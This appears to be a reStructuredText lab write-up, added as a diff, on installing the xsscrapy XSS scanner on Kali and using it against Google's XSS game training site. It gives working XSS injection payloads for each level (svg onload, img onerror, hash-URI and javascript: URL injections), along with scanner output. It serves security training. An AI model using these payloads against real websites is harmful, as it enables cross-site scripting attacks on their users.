@@ -1,0 +1,253 @@
+.. include:: /pentest_links.txt
+
+
+***********
+`xsscrapy`_
+***********
+
+what `xsscrapy`_ does & doesn't test
+====================================
+
+`XSScrapy: fast, thorough XSS vulnerability spider <http://danmcinerney.org/xsscrapy-fast-thorough-xss-vulnerability-spider/>`_ clearly states `xsscrapy`_'s target vulnerabilities: both *XSS attack vectors xsscrapy will test* and *XSS attack vectors xsscrapy will not test*.
+
+Since we'll be using `xsscrapy`_ against Google's `XSS game <https://xss-game.appspot.com/>`_ we'll repeat the *XSS attack vectors xsscrapy will not test* here:
+
+* Other headers
+
+  Let me know if you know of other headers you’ve seen XSS-exploitable in the wild and I may add checks for them in the script.
+
+* Persistent XSS’s reflected in pages other than the immediate response page
+
+  If you can create something like a calendar event with an XSS in it but you can only trigger it by visiting a specific URL that’s different from the immediate response page then this script will miss it.
+
+* DOM XSS
+
+  DOM XSS will go untested.
+
+* CAPTCHA protected forms
+
+  This should probably go without saying, but captchas will prevent the script from testing forms that are protected by them.
+
+* AJAX
+
+  Because Scrapy is not a browser, it will not render javascript so if you’re scanning a site that’s heavily built on AJAX this scraper will not be able to travel to all the available links. I will look into adding this functionality in the future although it is not a simple task.
+
+Google's XSS game has javascript-based XSS, including DOM and hash URI based vulnerabilities. `xsscrapy`_ does not test for those. `Modern techniques for XSS discovery <http://danmcinerney.org/modern-techniques-for-xss-discovery/>`_ mentions `DOMinatorPro <https://dominator.mindedsecurity.com/>`_ as one tool that tests for DOM-based XSS.
+
+
+installation & setup
+====================
+
+multiuser setup
+---------------
+
+`xsscrapy`_ fits in with the Kali Linux philosophy where you run everything as root (or at least as one user): the install directory appears to be a `scrapy`_  project created for running `xsscrapy`_. Of course this doesn't work well for multiple users or non-root users. So we'll try to come up with a multi-user installation: each user must create a `scrapy`_ xsscrapy project directory of their own. Since the created project misses all the important data from the `xsscrapy`_ install directory, the user should then replace their project's xsscrapy subdirectory there with a link to the shared `xsscrapy`_ installation directory. We believe the xsscrapy subdirectory is read-only.
+
+installation using pip
+----------------------
+
+`xsscrapy requirements <https://github.com/DanMcInerney/xsscrapy/blob/master/requirements.txt>`_ are currently:
+::
+
+  Scrapy==0.24.4
+  pybloom==1.1
+  requests
+  beautifulsoup
+
+Kali Linux is hopelessly behind in both scrapy (currently 0.14.4-1 vs. the required 0.24.4) and pybloom (0.3.11-1kali3 vs. the required pybloom 1.1), so we'll install it in /usr/local/bin resorting to using pip to pull in the latest versions:
+
+
+.. code-block:: bash
+
+  cd /usr/local/bin
+  sudo git clone https://github.com/DanMcInerney/xsscrapy.git git.xsscrapy
+  sudo ln -s git.xsscrapy/xsscrapy.py xsscrapy
+  cd git.xsscrapy
+  sudo wget https://bootstrap.pypa.io/get-pip.py
+  sudo python get-pip.py
+  sudo pip install -r requirements.txt
+
+Remember, `xsscrapy`_ is based on `scrapy`_ and in fact the `xsscrapy`_ installation directory is a `scrapy`_ project. To understand this, consult `Scrapy Command line tool <http://doc.scrapy.org/en/latest/topics/commands.html>`_ section *Default structure of Scrapy projects*.
+
+  Before delving into the command-line tool and its sub-commands, let’s first understand the directory structure of a Scrapy project.
+
+  Though it can be modified, all Scrapy projects have the same file structure by default, similar to this: ::
+
+    scrapy.cfg
+    myproject/
+        __init__.py
+        items.py
+        pipelines.py
+        settings.py
+        spiders/
+            __init__.py
+            spider1.py
+            spider2.py
+            ...
+
+
+  The directory where the scrapy.cfg file resides is known as the project root directory. That file contains the name of the python module that defines the project settings. Here is an example: ::
+
+    [settings]
+    default = myproject.settings
+
+
+What this all means is that you cannot "just run" ``xsscrapy`` from any old directory - it must be a ``scrapy`` project directory. If not you'll get the following error:
+
+.. code-block:: console
+
+  hacker@kali:~$ xsscrapy -u http://example.com/
+  Scrapy 0.24.4 - no active project
+
+  Unknown command: crawl
+
+  Use "scrapy" to see available commands
+
+per-user `scrapy`_ project directory
+------------------------------------
+
+But an unpriviledged user can't run from the install directory as it will attempt to create an output file *DIRECTORY-vulns.txt* there. So you create a project directory somewhere in your home directory and replace the xsscrapy subdirectory with a link to the installation xsscrapy subdirectory:
+
+.. code-block:: bash
+
+  scrapy startproject xsscrapy
+  cd xsscrapy
+  # our xsscrapy subdirectory must be replaced by xsscrapy's
+  rm -rf xsscrapy
+  ln -s /usr/local/bin/git.xsscrapy/xsscrapy .
+
+use it on Google's XSS Game
+===========================
+
+We attempted to use `xsscrapy`_ on Google's `XSS game <https://xss-game.appspot.com/>`_ (assuming that a `scrapy`_ project was created in *~/local/XSS/xsscrapy*). Levels 1 & 5 were solved; levels 2-4 & 6 were not solved. Only level 4 was not solved but appeared to be within `xsscrapy`_'s scope.
+
+First, a side note on why `xsscrapy`_ gets by without the seemingly required XSS game cookies. The Google App Engine XSS game has a python controller that actually does two things: (1) provides the game which traps the ``alert()`` and shows the code & hints; (2) runs the vulnerable app within an iframe surrounded by the game content. The code we are shown is what would be the code for the iframe only if there were no surrounding game - the game's code is not shown. And while the game page `https://xss-game.appspot.com/level6/ <https://xss-game.appspot.com/level6/>`_ is protected by a cookie, the level's iframe `https://xss-game.appspot.com/level6/frame <https://xss-game.appspot.com/level6/frame>`_ is not. And that's how `xsscrapy`_ is able to be used to attack the game: it uses the iframe link. If the game really needed such a cookie we are not aware of a way to pass the cookie to `xsscrapy`_.
+
+Level 1
+-------
+
+`xsscrapy`_ did find the vulnerability. When `xsscrapy`_ finds a vulnerability it will create or append to the *xsscrapy-vuln.txt* file.
+
+Run `xsscrapy`_ in the `scrapy`_ project directory *~/local/XSS/xsscrapy*:
+
+.. code-block:: console
+
+  hacker@kali:~/local/XSS/xsscrapy$ cd local/XSS/xsscrapy
+  hacker@kali:~/local/XSS/xsscrapy$ xsscrapy -u http://xss-game.appspot.com/
+  ###################### SNIP ######################
+  hacker@kali:~/local/XSS/xsscrapy$ ls
+  scrapy.cfg  xsscrapy  xsscrapy-vulns.txt
+  hacker@kali:~/local/XSS/xsscrapy$ cat xsscrapy-vulns.txt 
+  URL: http://xss-game.appspot.com/level1/frame
+  response URL: http://xss-game.appspot.com/level1/frame?query=9zqjxat%27%22%28%29%7B%7D%3Cx%3E%3A%2F9zqjxat%3B9
+  POST url: http://xss-game.appspot.com/level1/frame
+  Unfiltered: '"(){}<x>:/;
+  Payload: 9zqjxat'"(){}<x>:/9zqjxat;9
+  Type: form
+  Injection point: query
+  Possible payloads: <svG onLoad=prompt(9)>
+  Line: <b>9zqjxat'"(){}<x>:/9zqjxat;9
+
+`xsscrapy`_ found the injection point ``query`` with payload ``<svG onLoad=prompt(9)>`` which we convert to using ``alert(9)`` instead of ``prompt(9)``. Trying location ``https://xss-game.appspot.com/level1/frame?query=<svG onLoad=alert(9)>`` in the browser solves level 1 and gives the browser the cookie it needs to proceed in game.
+
+Level 2
+-------
+
+`xsscrapy`_ did not find the vulnerability solution: enter ``<img src="a b" onerror="alert('boo')" />`` in the form.
+
+The XSS vulnerability is a client-side-only javascript/DOM XSS vulnerability; `xsscrapy`_ does not test DOM XSS.
+
+Level 3
+-------
+
+`xsscrapy`_ did not find the XSS vulnerability solution: enter location ``https://xss-game.appspot.com/level3/frame#x' onerror='alert("boo")'``.
+
+Unlike level 2 you can enter the XSS vulnerability in the location bar just like doing an HTTP GET. But the client uses jQuery with hash URIs; that is, the part of the URI after the *#* is not sent to the server but is processed by the client's browser. So just like level 2 this is a client-side javascript XSS vulnerability which `xsscrapy`_ does not test.
+
+For a little background on hash URIs read `6 Things You Should Know About Fragment URLs  <http://blog.httpwatch.com/2011/03/01/6-things-you-should-know-about-fragment-urls/>`_. It clearly states that the URI part after the **#** is client-side only. Read Wikipedia's `Fragment identifier <http://en.wikipedia.org/wiki/Fragment_identifier>`_ for more information (our bolding below):
+
+  In URIs a hashmark # introduces the optional fragment near the end of the URL. The generic RFC 3986 syntax for URIs also allows an optional query part introduced by a question mark ?. In URIs with a query and a fragment, the fragment follows the query. Query parts depend on the URI scheme and are evaluated by the server — e.g., http: supports queries unlike ftp:. Fragments depend on the document MIME type and are evaluated by the client (Web browser). Clients are not supposed to send URI-fragments to servers when they retrieve a document, and without help from a local application (see below) fragments do not participate in HTTP redirections.
+
+  ...
+
+  The fragment identifier functions differently than the rest of the URI: namely, its processing is exclusively client-side with no participation from the web server ...
+
+
+Level 4
+-------
+
+`xsscrapy`_ did not find the XSS vulnerability solution: enter ``3');alert('boo`` in the form.
+
+Now the XSS vulnerability is easily discoverable: just open up a browser window `3')%3Balert('boo <https://xss-game.appspot.com/level4/frame?timer=3')%3Balert('boo>`_ or even more encoded `timer=3%27%29%3Balert%28%27boo <https://xss-game.appspot.com/level4/frame?timer=3%27%29%3Balert%28%27boo>`_ - you'll get the alert::
+
+  Congratulations, you executed an alert:
+  boo
+  You can now advance to the next level.
+
+Alternatively you could use ``curl`` to view the returned page:
+
+.. code-block:: console
+
+   hacker@kali:~/local/XSS/xsscrapy$ curl \
+       https://xss-game.appspot.com/level4/frame?timer=3%27%29%3Balert%28%27boo
+   <!doctype html>
+   <html>
+     <head>
+       <!-- Internal game scripts/styles, mostly boring stuff -->
+       <script src="/static/game-frame.js"></script>
+       <link rel="stylesheet" href="/static/game-frame-styles.css" />
+
+       <script>
+         function startTimer(seconds) {
+           seconds = parseInt(seconds) || 3;
+           setTimeout(function() { 
+             window.confirm("Time is up!");
+             window.history.back();
+           }, seconds * 1000);
+         }
+       </script>
+     </head>
+     <body id="level4">
+       <img src="/static/logos/level4.png" />
+       <br>
+       <img src="/static/loading.gif" onload="startTimer('3&#39;);alert(&#39;boo');" />
+       <br>
+       <div id="message">Your timer will execute in 3&#39;);alert(&#39;boo seconds.</div>
+     </body>
+   </html>
+
+In either case you'll see the vulnerable ``<img src="/static/loading.gif" onload="startTimer('3&#39;);alert(&#39;boo');" />`` returned which `xsscrapy`_ doesn't find. With ``xsscrapy -u https://xss-game.appspot.com/level4/frame``, `xsscrapy`_ does find the query parameter ``timer`` but does not successfully attack it.
+
+
+Level 5
+-------
+
+We run `xsscrapy`_ in the `scrapy`_ project directory *~/local/XSS/xsscrapy*:
+
+.. code-block:: console
+
+  hacker@kali:~/local/XSS/xsscrapy$ cd local/XSS/xsscrapy
+  hacker@kali:~/local/XSS/xsscrapy$ xsscrapy \
+      -u https://xss-game.appspot.com/level5/frame
+  ###################### SNIP ######################
+  hacker@kali:~/local/XSS/xsscrapy$ ls
+  scrapy.cfg  xsscrapy  xsscrapy-vulns.txt
+  hacker@kali:~/local/XSS/xsscrapy$ cat xsscrapy-vulns.txt 
+  URL: https://xss-game.appspot.com/level5/frame/signup?next=confirm
+  response URL: https://xss-game.appspot.com/level5/frame/signup?next=9zqjxnt'%22()%7B%7D%3Cx%3E:/9zqjxnt;9
+  Unfiltered: (){}x:/
+  Payload: 9zqjxnt'"(){}<x>:/9zqjxnt;9
+  Type: url
+  Injection point: next
+  Possible payloads: JavaSCript:prompt(9)
+  Line: <a href="9zqjxnt&#39;&quot;(){}&lt;x&gt;:/9zqjxnt
+
+Now `xsscrapy`_ found the injection point ``next`` with payload ``JavaSCript:prompt(9)`` which we convert to using ``alert(9)`` instead of ``prompt(9)``. Trying ``https://xss-game.appspot.com/level5/frame/signup?next=JavaSCript:alert(9)`` that with the browsers solves level5.
+
+
+Level 6
+-------
+
+`xsscrapy`_ did not find the XSS vulnerability: enter location ``https://xss-game.appspot.com/level6/frame#data:text/javascript,alert("boo")``.
+
+Like level4, level 6 uses a hash URI with client-side javascript creating the vulnerable page dynamically; `xsscrapy`_ does not test DOM XSS.
